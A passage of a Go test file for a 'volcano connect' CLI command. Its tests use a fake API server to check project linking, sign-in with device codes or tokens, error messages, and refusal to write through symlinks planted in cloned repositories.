	assert.Zero(t, fake.creates)
	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, connectOtherProjectID, link.Project.ID)
}

func TestConnectWithNameReplacesABadLinkWithANewProject(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := chdirTemp(t)
	path := writeBadLink(t, dir)

	out, err := runConnectHere(t, server, "--name", "shop")
	require.NoError(t, err)
	assert.Contains(t, out, "Warning: Replacing a project link that can't be used: failed to parse project link "+path)
	assert.Equal(t, 1, fake.creates)
	assert.Contains(t, out, "Directory: .\n", "the directory that holds the link is the one set up")
	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, cliconfig.ProjectConfig{ID: connectProjectID, Name: "shop"}, link.Project)
}

func TestConnectIgnoresABadLinkAboveTheDirectory(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)
	path := writeBadLink(t, parent)
	dir := filepath.Join(parent, "my-app")

	out, err := runConnect(t, server, dir)
	require.NoError(t, err)
	assert.Contains(t, out, "Warning: Ignoring a project link that can't be used: failed to parse project link "+path)
	assert.Equal(t, 1, fake.creates)
	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, dir, link.Dir)
	assert.Equal(t, badLink, readFile(t, path), "the parent's link is left alone")
}

func TestConnectWithProjectAndNoDirectoryUsesTheProjectName(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)

	out, err := runConnectHere(t, server, "--project", connectOtherProjectID)
	require.NoError(t, err)
	assert.Contains(t, out, "Directory: ./blog\n")
	assert.Zero(t, fake.creates)
	link, err := cliconfig.FindLink(filepath.Join(parent, "blog"))
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, connectOtherProjectID, link.Project.ID)
}

// The first run says to cd into the new directory. Rerunning the same command
// there sets up that directory instead of a ./blog inside it.
func TestConnectWithProjectRerunInsideItsDirectoryReusesIt(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(chdirTemp(t), "blog")

	_, err := runConnectHere(t, server, "--project", connectOtherProjectID)
	require.NoError(t, err)
	t.Chdir(dir)

	out, err := runConnectHere(t, server, "--project", connectOtherProjectID)
	require.NoError(t, err)
	assert.Contains(t, out, "Directory: .\n")
	assert.NoDirExists(t, filepath.Join(dir, "blog"))
}

// A link can spell the project ID in uppercase. --project with the same ID
// still sets up the linked directory instead of a ./blog inside it.
func TestConnectWithProjectReusesALinkWithAnUppercaseID(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectHexProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := chdirTemp(t)
	require.NoError(t, os.MkdirAll(filepath.Join(dir, ".volcano"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, cliconfig.LinkRelPath),
		[]byte(`{"project_id":"`+strings.ToUpper(connectHexProjectID)+`","project_name":"blog"}`), 0o644))

	out, err := runConnectHere(t, server, "--project", connectHexProjectID)
	require.NoError(t, err)
	assert.Contains(t, out, "Directory: .\n")
	assert.NoDirExists(t, filepath.Join(dir, "blog"))
}

func TestConnectWithProjectAndNoDirectoryKeepsAnotherProjectsDirectory(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{
		connectProjectPayload(connectProjectID, "my_app"),
		connectProjectPayload(connectOtherProjectID, "my-app"),
	}}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)

	// A rerun for the same project reuses its directory.
	for range 2 {
		_, err := runConnectHere(t, server, "--project", connectProjectID)
		require.NoError(t, err)
	}

	// my-app makes the same directory name as my_app, which is linked to it.
	_, err := runConnectHere(t, server, "--project", connectOtherProjectID)
	require.ErrorContains(t, err, "./my-app is linked to another project")
	link, err := cliconfig.FindLink(filepath.Join(parent, "my-app"))
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, connectProjectID, link.Project.ID, "the link is unchanged")
}

// A cloned repository can commit ./blog as a symlink out of the checkout.
// connect picked that directory itself, so it refuses instead of following it.
func TestConnectWithProjectRefusesASymlinkedProjectDirectory(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("needs a symlink")
	}
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)
	outside := t.TempDir()
	dir := filepath.Join(parent, "blog")
	require.NoError(t, os.Symlink(outside, dir))

	_, err := runConnectHere(t, server, "--project", connectOtherProjectID)
	require.ErrorContains(t, err, dir+" is a symlink")
	entries, err := os.ReadDir(outside)
	require.NoError(t, err)
	assert.Empty(t, entries, "nothing is written through the symlink")
}

// A symlink at a generated name counts as taken, even one whose target is
// missing.
func TestConnectWithNoDirectorySkipsANameWithASymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("needs a symlink")
	}
	setConnectTestHome(t)
	useGeneratedName(t, "fuji-amber-42")
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)
	require.NoError(t, os.Symlink(filepath.Join(t.TempDir(), "missing"), filepath.Join(parent, "fuji-amber-42")))

	out, err := runConnectHere(t, server, "--json")
	require.NoError(t, err)
	var res result
	require.NoError(t, json.Unmarshal([]byte(out), &res), out)
	assert.Equal(t, filepath.Join(parent, "fuji-amber-42-2"), res.Directory)
}

func TestConnectLeavesNoDirectoryWhenTheProjectIsNotCreated(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, createStatus: http.StatusForbidden, createError: "project limit exceeded (max 1 projects per user)"}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(t.TempDir(), "my-app")

	_, err := runConnect(t, server, dir)
	require.ErrorContains(t, err, "project limit exceeded")
	assert.NoDirExists(t, dir)
}

// A directory connect can't create would otherwise fail only after the
// project was created, and after the device code was spent.
func TestConnectRefusesADirectoryUnderAFileBeforeSigningIn(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := filepath.Join(t.TempDir(), "parent")
	require.NoError(t, os.WriteFile(parent, []byte("x"), 0o644))

	_, err := runConnect(t, server, filepath.Join(parent, "app"), "--name", "app", "--device-code", connectDeviceCode)
	require.ErrorContains(t, err, parent+" is not a directory")
	assert.Zero(t, fake.polls)
	assert.Zero(t, fake.creates)
}

func TestConnectNamesTheCreatedProjectWhenItsDirectoryCantBeCreated(t *testing.T) {
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("needs a directory the test can't write to")
	}
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	readOnly := filepath.Join(t.TempDir(), "read-only")
	require.NoError(t, os.Mkdir(readOnly, 0o555))
	t.Cleanup(func() { _ = os.Chmod(readOnly, 0o755) })
	dir := filepath.Join(readOnly, "my-app")

	_, err := runConnect(t, server, dir)
	require.ErrorContains(t, err, "failed to create "+dir)
	require.ErrorContains(t, err, "Created project my-app ("+connectProjectID+"), but did not link it. "+
		"To set it up, run: volcano connect "+dir+" --project "+connectProjectID)
	assert.Equal(t, 1, fake.creates)
}

// A symlink where the link should be, even a dangling one, is a link connect
// can't read, so it stops before signing in or creating a project.
func TestConnectRefusesASymlinkedLinkBeforeCreatingAProject(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("needs a symlink")
	}
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := chdirTemp(t)
	path := filepath.Join(dir, cliconfig.LinkRelPath)
	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0o755))
	require.NoError(t, os.Symlink(filepath.Join(t.TempDir(), "missing.json"), path))

	_, err := runConnect(t, server, ".")
	require.ErrorContains(t, err, path+" is not a regular file")
	assert.Zero(t, fake.creates)
}

// A cloned repository can commit any of the files connect writes as a symlink
// to a user file, such as the CLI's own config. Connect names the symlink and
// leaves the target as it was.
func TestConnectRefusesToWriteThroughASymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("needs a symlink")
	}
	for _, rel := range []string{filepath.Join("volcano", "cloud.env"), ".gitignore", "AGENTS.md"} {
		t.Run(rel, func(t *testing.T) {
			setConnectTestHome(t)
			fake := &fakeAPI{t: t}
			server := httptest.NewServer(fake)
			defer server.Close()
			dir := chdirTemp(t)
			// A volcano directory skips the scaffold, which would otherwise
			// write volcano/ first.
			require.NoError(t, os.MkdirAll(filepath.Join(dir, "volcano"), 0o755))
			configPath, err := cliconfig.Path()
			require.NoError(t, err)
			before := readFile(t, configPath)
			path := filepath.Join(dir, rel)
			require.NoError(t, os.Symlink(configPath, path))

			_, err = runConnect(t, server, ".")
			require.ErrorContains(t, err, path+" is a symlink, and the CLI doesn't write through one")
			assert.Equal(t, before, readFile(t, configPath))
		})
	}
}

// A rerun from the working directory would not find the link in the new
// directory below it, so a failure after the link names that directory.
func TestConnectNamesTheNewDirectoryWhenSetupFailsAfterTheLink(t *testing.T) {
	setConnectTestHome(t)
	useGeneratedName(t, "fuji-amber-42")
	fake := &fakeAPI{t: t, anonKeyStatus: http.StatusInternalServerError}
	server := httptest.NewServer(fake)
	defer server.Close()
	chdirTemp(t)

	out, err := runConnectHere(t, server)
	require.Error(t, err)
	assert.Contains(t, out, "Linked "+filepath.Join("fuji-amber-42", ".volcano", "project.json"))
	require.ErrorContains(t, err, "Created project fuji-amber-42 ("+connectProjectID+") and linked it in ./fuji-amber-42. To finish setting it up, run: volcano connect ./fuji-amber-42")
	// The new link is gitignored even though the run stopped, and the rerun,
	// which finds the link, can't add the entry any more.
	assert.Contains(t, readFile(t, filepath.Join("fuji-amber-42", ".gitignore")), ".volcano/project.json\n")

	fake.anonKeyStatus = 0
	_, err = runConnectHere(t, server, "./fuji-amber-42")
	require.NoError(t, err)
	assert.Equal(t, 1, fake.creates, "the rerun uses the linked project")
}

// A stopped wait leaves a created project with no link, so a rerun of the same
// command would create another.
func TestConnectNamesTheCreatedProjectWhenTheWaitStops(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, createdStatus: "provisioning"}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(t.TempDir(), "my-app")
	ctx, cancel := context.WithTimeout(t.Context(), time.Second)
	defer cancel()

	cmd := New(cliruntime.Deps{HTTPClient: server.Client(), APIBaseURL: server.URL})
	cmd.SetOut(&bytes.Buffer{})
	cmd.SetErr(&bytes.Buffer{})
	cmd.SetIn(strings.NewReader(""))
	cmd.SetArgs([]string{dir, "--skip-skills"})
	err := cmd.ExecuteContext(ctx)
	require.ErrorIs(t, err, context.DeadlineExceeded)
	require.ErrorContains(t, err, "To set it up, run: volcano connect "+dir+" --project "+connectProjectID)
	assert.Equal(t, 1, fake.creates)
}

func TestConnectQuotesTheCreatedProjectsDirectoryWhenTheWaitStops(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, createdStatus: "provisioning"}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(t.TempDir(), "My App")
	ctx, cancel := context.WithTimeout(t.Context(), time.Second)
	defer cancel()

	cmd := New(cliruntime.Deps{HTTPClient: server.Client(), APIBaseURL: server.URL})
	cmd.SetOut(&bytes.Buffer{})
	cmd.SetErr(&bytes.Buffer{})
	cmd.SetIn(strings.NewReader(""))
	cmd.SetArgs([]string{dir, "--skip-skills"})
	err := cmd.ExecuteContext(ctx)
	require.ErrorContains(t, err, "To set it up, run: volcano connect '"+dir+"' --project "+connectProjectID)
}

// The home directory's .volcano holds the CLI's config, so it can't be linked.
func TestConnectRefusesTheHomeDirectory(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()

	_, err := runConnect(t, server, os.Getenv("HOME"))
	require.ErrorIs(t, err, cliconfig.ErrHomeLink)
	assert.Zero(t, fake.creates)
}

// A --project that isn't an ID fails before the device code is spent.
func TestConnectChecksTheProjectIDBeforeSigningIn(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	chdirTemp(t)

	_, err := runConnectHere(t, server, "--device-code", connectDeviceCode, "--project", "my-app")
	require.ErrorContains(t, err, `--project takes a project ID, got "my-app"`)
	assert.Zero(t, fake.polls, "the device code is not spent")
}

// The dashboard approved the code before the user pasted the prompt, so
// connect signs in without device authorization or the browser.
func TestConnectWithADeviceCodeSignsInWithoutTheBrowser(t *testing.T) {
	setConnectTestHome(t)
	useGeneratedName(t, "fuji-amber-42")
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	chdirTemp(t)

	stdout, stderr, err := runConnectHereWithStderr(t, server, "--device-code", connectDeviceCode)
	require.NoError(t, err)
	assert.Contains(t, stdout, "Signed in with the code from the dashboard")
	assert.Equal(t, 1, fake.polls)
	assert.False(t, fake.deviceAuthorize, "the dashboard already started the device login")
	assert.Equal(t, "Bearer pk-exchanged", fake.createAuth)
	assertDeviceCodeHidden(t, stdout, stderr)

	cfg, err := cliconfig.Load()
	require.NoError(t, err)
	assert.Equal(t, "pk-exchanged", cfg.UserToken)
	assert.Equal(t, "user-1", cfg.UserID)
}

func TestConnectWithATokenSignsInWithIt(t *testing.T) {
	setConnectTestHome(t)
	useGeneratedName(t, "fuji-amber-42")
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	chdirTemp(t)

	out, err := runConnectHere(t, server, "--token", "pk-given")
	require.NoError(t, err)
	assert.Contains(t, out, "Signed in with the token")
	assert.Equal(t, "Bearer pk-given", fake.createAuth)
	assert.Zero(t, fake.polls)
	assert.False(t, fake.deviceAuthorize)

	cfg, err := cliconfig.Load()
	require.NoError(t, err)
	assert.Equal(t, "pk-given", cfg.UserToken)
}

func TestConnectSavesTheDeviceLoginWhenProjectIsWrong(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	chdirTemp(t)

	_, err := runConnectHere(t, server, "--device-code", connectDeviceCode, "--project", connectOtherProjectID)
	require.ErrorContains(t, err, "failed to get project "+connectOtherProjectID)

	cfg, err := cliconfig.Load()
	require.NoError(t, err)
	assert.Equal(t, "pk-exchanged", cfg.UserToken, "the device code's login is kept for the next run")
	assert.Nil(t, cfg.CurrentProject, "connect leaves the volcano use selection alone")
}

func TestConnectSavesTheDeviceLoginWhenItsCheckFails(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, listStatus: http.StatusInternalServerError}
	server := httptest.NewServer(fake)
	defer server.Close()
	chdirTemp(t)

	out, err := runConnectHere(t, server, "--device-code", connectDeviceCode)
	require.ErrorContains(t, err, "device code authentication failed")
	assert.Contains(t, out, "The code from the dashboard is spent, but its login is saved. Run the command again without --device-code.")
	assert.Zero(t, fake.creates)

	cfg, err := cliconfig.Load()
	require.NoError(t, err)
	assert.Equal(t, "pk-exchanged", cfg.UserToken, "the device code's login is kept for the next run")
}

func TestConnectRefusesATokenThatVolcanoTokenWouldOverride(t *testing.T) {
	setConnectTestHome(t)
	t.Setenv("VOLCANO_TOKEN", "pk-from-env")
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()

	for _, flags := range [][]string{{"--device-code", connectDeviceCode}, {"--token", "pk-other"}, {"--signup", "--email", "a@example.com"}} {
		_, err := runConnect(t, server, t.TempDir(), flags...)
		require.ErrorContains(t, err, "VOLCANO_TOKEN is set", flags)
	}
	assert.Zero(t, fake.polls, "the device code is not spent")
	assert.Zero(t, fake.creates)
	assert.False(t, fake.deviceAuthorize)
	cfg, err := cliconfig.Load()
	require.NoError(t, err)
	assert.Equal(t, "pk-connect", cfg.UserToken, "the saved login is unchanged")
}

// VOLCANO_PROJECT_ID is deprecated, and would override the link connect
// writes. Connect refuses it whatever it names, before it signs in, so the
// device code isn't spent, and before it calls the API or changes a file.
func TestConnectRefusesVolcanoProjectID(t *testing.T) {
	for name, tc := range map[string]struct {
		env    string
		args   []string
		linked bool
	}{
		"another project than --project": {env: connectOtherProjectID, args: []string{"--project", connectProjectID}},
		"the project --project names":    {env: connectProjectID, args: []string{"--project", connectProjectID}},
		"a new project":                  {env: connectProjectID},
		"a linked directory":             {env: connectProjectID, linked: true},
		"a value that is not an ID":      {env: "not-a-project\n"},
	} {
		t.Run(name, func(t *testing.T) {
			setConnectTestHome(t)
			t.Setenv("VOLCANO_PROJECT_ID", tc.env)
			fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectProjectID, "shop")}}
			requests := 0
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				requests++
				fake.ServeHTTP(w, r)
			}))
			defer server.Close()
			dir := filepath.Join(chdirTemp(t), "shop")
			if tc.linked {
				_, err := cliconfig.WriteLink(dir, cliconfig.ProjectConfig{ID: connectProjectID, Name: "shop"})
				require.NoError(t, err)
			}

			_, err := runConnect(t, server, dir, append([]string{"--device-code", connectDeviceCode}, tc.args...)...)
			require.EqualError(t, err, "VOLCANO_PROJECT_ID is set, and volcano connect does not use it. "+
				"Unset it, and pass --project <project-id> to set up an existing project")
			assert.Zero(t, requests, "no API call, so the device code is not spent")
			assert.Zero(t, fake.polls)
			assert.Zero(t, fake.creates)
			assert.False(t, fake.deviceAuthorize)
			assert.NoFileExists(t, filepath.Join(dir, "volcano", "cloud.env"))
			if !tc.linked {
				assert.NoDirExists(t, dir)
			}
		})
	}
}

// A blank VOLCANO_PROJECT_ID, as `VOLCANO_PROJECT_ID=` leaves it, is unset.
func TestConnectIgnoresABlankVolcanoProjectID(t *testing.T) {
	setConnectTestHome(t)
	t.Setenv("VOLCANO_PROJECT_ID", " \n")
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectProjectID, "shop")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(chdirTemp(t), "shop")

	_, err := runConnect(t, server, dir, "--project", connectProjectID)
	require.NoError(t, err)
	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, connectProjectID, link.Project.ID)
}

func TestConnectWithARefusedDeviceCodeGoesToBrowserLogin(t *testing.T) {
	for _, tc := range []struct{ pollError, reason string }{
		{"expired_token", "has expired"},
		{"access_denied", "was denied"},
		{"invalid_grant", "is not valid or was already used"},
	} {
		t.Run(tc.pollError, func(t *testing.T) {
			setConnectTestHome(t)
			useGeneratedName(t, "fuji-amber-42")
			fake := &fakeAPI{t: t, pollError: tc.pollError}
			server := httptest.NewServer(fake)
			defer server.Close()
			chdirTemp(t)

			stdout, stderr, err := runConnectHereWithStderr(t, server, "--device-code", connectDeviceCode)
			// The fake refuses device authorization, so browser login fails;
			// what matters is that connect went there instead of to the saved
			// login.
			require.ErrorContains(t, err, "browser authentication failed")
			assert.Contains(t, stdout, "The code from the dashboard "+tc.reason+". Signing in in the browser instead.")
			assert.True(t, fake.deviceAuthorize, "browser login started")
			assert.Zero(t, fake.creates, "the saved login, possibly another account, is never used")
			assertDeviceCodeHidden(t, stdout+err.Error(), stderr)
		})
	}
}

// assertDeviceCodeHidden checks the device code is in neither output nor the
// saved config.
func assertDeviceCodeHidden(t *testing.T, stdout, stderr string) {
	t.Helper()
	assert.NotContains(t, stdout, connectDeviceCode)
	assert.NotContains(t, stderr, connectDeviceCode)
	path, err := cliconfig.Path()
	require.NoError(t, err)
	assert.NotContains(t, readFile(t, path), connectDeviceCode)
}

func TestProjectNameAsksOnlyWhenNothingMarksTheRunNonInteractive(t *testing.T) {
	ask := func() string {
		var log bytes.Buffer
		name, err := projectName(options{in: strings.NewReader("typed\n"), log: &log}, "fallback")
		require.NoError(t, err)
		return name
	}
	t.Setenv("CI", "")
	t.Setenv("VOLCANO_NONINTERACTIVE", "")
	t.Setenv("TERM", "xterm-256color")
	assert.Equal(t, "typed", ask())

	for key, value := range map[string]string{"CI": "true", "VOLCANO_NONINTERACTIVE": "1", "TERM": "dumb"} {
		t.Run(key, func(t *testing.T) {
			t.Setenv(key, value)
			assert.Equal(t, "fallback", ask(), "an agent in a terminal is never asked")
		})
	}
}

func TestGenerateProjectName(t *testing.T) {
	assert.Regexp(t, `^[a-z]+-[a-z]+-\d{2}$`, generateProjectName())
}

func TestDisplayDir(t *testing.T) {
	assert.Equal(t, ".", displayDir("/w", "/w"))
	assert.Equal(t, "./app", displayDir("/w", "/w/app"))
	assert.Equal(t, "/other", displayDir("/w", "/other"))
	assert.Equal(t, "./..x", displayDir("/w", "/w/..x"))
}

func TestDefaultProjectName(t *testing.T) {
	assert.Equal(t, "my-app", defaultProjectName("/tmp/My App"))
	assert.Equal(t, "shop-v2", defaultProjectName("/tmp/shop_v2"))
	assert.Equal(t, "my-app", defaultProjectName("/tmp/_"))
}

func runConnect(t *testing.T, server *httptest.Server, dir string, args ...string) (string, error) {
	t.Helper()
	cmd := New(cliruntime.Deps{HTTPClient: server.Client(), APIBaseURL: server.URL})
	var stdout, stderr bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetIn(strings.NewReader(""))
	cmd.SetArgs(append([]string{dir, "--skip-skills"}, args...))
	err := cmd.Execute()
	return stdout.String(), err
}

// runConnectHere runs connect with no directory argument.
func runConnectHere(t *testing.T, server *httptest.Server, args ...string) (string, error) {
	t.Helper()
	stdout, _, err := runConnectHereWithStderr(t, server, args...)
	return stdout, err
}

// runConnectHereWithStderr runs connect with no directory argument, and
// returns stdout and stderr apart. Browser login is never opened.
func runConnectHereWithStderr(t *testing.T, server *httptest.Server, args ...string) (string, string, error) {
	t.Helper()
	cmd := New(cliruntime.Deps{HTTPClient: server.Client(), APIBaseURL: server.URL, OpenBrowser: func(string) error {
		t.Error("connect opened the browser")
		return nil
	}})
	var stdout, stderr bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetIn(strings.NewReader(""))
	cmd.SetArgs(append([]string{"--skip-skills"}, args...))
	err := cmd.Execute()
	return stdout.String(), stderr.String(), err
}

// chdirTemp moves into a new temp directory and returns its path as Getwd
// reports it, which on macOS resolves the /var symlink.
func chdirTemp(t *testing.T) string {
	t.Helper()
	t.Chdir(t.TempDir())
	wd, err := os.Getwd()
	require.NoError(t, err)
	return wd
}

func useGeneratedName(t *testing.T, name string) {
	t.Helper()
	previous := generateName
	generateName = func() string { return name }
	t.Cleanup(func() { generateName = previous })
}

func setConnectTestHome(t *testing.T) {
	t.Helper()
	t.Setenv("HOME", t.TempDir())
	for _, key := range []string{"VOLCANO_TOKEN", "VOLCANO_PROJECT_ID", "VOLCANO_API_URL", "VOLCANO_WEB_URL"} {
		t.Setenv(key, "")
	}
	require.NoError(t, (&cliconfig.Config{UserToken: "pk-connect"}).Save())
}

func connectProjectPayload(id, name string) map[string]any {
	now := time.Now().UTC().Format(time.RFC3339)
	return map[string]any{
		"id": id, "name": name, "status": "active",
		"all_regions": true, "selected_regions": []string{},
		"created_at": now, "updated_at": now,
	}
}

func writeConnectJSON(t *testing.T, w http.ResponseWriter, status int, value any) {
	t.Helper()
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	require.NoError(t, json.NewEncoder(w).Encode(value))
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	require.NoError(t, err)
	return string(data)
}

func assertGitIgnored(t *testing.T, dir string, paths ...string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	require.NoError(t, exec.Command("git", "-C", dir, "init", "-q").Run())
	for _, path := range paths {
		out, err := exec.Command("git", "-C", dir, "check-ignore", path).CombinedOutput()
		assert.NoError(t, err, "%s is not gitignored: %s", path, out)
	}
}
